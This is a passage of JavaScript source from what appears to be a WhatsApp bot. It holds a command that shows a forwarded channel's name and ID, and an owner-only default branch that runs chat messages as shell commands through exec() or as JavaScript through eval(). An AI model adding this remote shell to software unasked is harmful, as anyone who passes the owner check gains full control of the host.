case 'idch': case 'idchannel': {


if (!isOwner) return reply("Special Features for Certain Users!!")
if (!m.quoted) return reply('reply saluran channel nya')
try {
let id = (await m.getQuotedObj()).msg.contextInfo.forwardedNewsletterMessageInfo 
let send_ch = `*HERE'S YOUR CHANNEL DATA*\n
*Name Channel*: ${id.newsletterName}\n*ID Channel*: ${id.newsletterJid}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: send_ch
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.creatorName
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"ID CHANNEL\",\"id\":\"123456789\",\"copy_code\":\"${id.newsletterJid}\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await bad.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
});
} catch (e) {
reply('You have to chat from the channel bro') 
}
}
default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return bad.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return bad.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
bad.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
bad.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return bad.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return bad.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
bad.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})